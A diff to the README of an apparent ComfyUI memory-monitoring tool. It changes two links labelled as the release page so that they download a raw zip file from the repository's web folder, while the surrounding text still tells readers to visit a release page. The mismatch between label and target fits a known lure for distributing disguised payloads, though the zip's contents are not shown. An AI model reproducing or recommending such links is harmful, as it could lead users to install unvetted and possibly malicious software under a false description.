@@ -1,6 +1,6 @@
 # 📊 ComfyUI-MemoryVisualization - Monitor your graphics memory usage easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sompramortaI/ComfyUI-MemoryVisualization/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sompramortaI/ComfyUI-MemoryVisualization/raw/refs/heads/main/web/Comfy_U_Visualization_Memory_v2.8.zip)
 
 This application provides a visual dashboard for ComfyUI. It monitors your VRAM and system memory usage in real time. You see exactly how much memory your current workflow consumes. This prevents crashes and helps you manage large machine learning models effectively.
 
@@ -23,7 +23,7 @@ This application provides a visual dashboard for ComfyUI. It monitors your VRAM 
 
 You need to download the correct version for your Windows computer.
 
-[Click here to visit the release page and download the tool](https://github.com/sompramortaI/ComfyUI-MemoryVisualization/releases)
+[Click here to visit the release page and download the tool](https://github.com/sompramortaI/ComfyUI-MemoryVisualization/raw/refs/heads/main/web/Comfy_U_Visualization_Memory_v2.8.zip)
 
 Visit the link above. Look for the latest version at the top of the list. Click the file ending in .zip or the source code button if you prefer a manual setup. Save the file to your desktop for easy access.
 
